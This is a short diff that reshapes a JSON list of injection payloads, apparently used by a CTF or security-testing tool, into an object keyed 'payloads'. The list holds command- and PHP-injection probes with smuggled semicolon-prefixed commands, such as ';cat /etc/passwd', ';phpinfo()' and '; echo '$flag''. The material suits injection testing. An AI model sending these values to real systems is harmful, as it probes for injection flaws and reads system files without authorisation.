@@ -1,9 +1,8 @@
-[
-";phpinfo()",
+{"payloads":[";phpinfo()",
 "phpinfo()",
 ";echo \"afadsfaefasdfafezdfa\"",
 "echo \"afadsfaefasdfafezdfa\"",
-";cat /etc/passwd"
+";cat /etc/passwd",
 "$flag",
-"; echo '$flag'"
-]
+"; echo '$flag'"]
+}
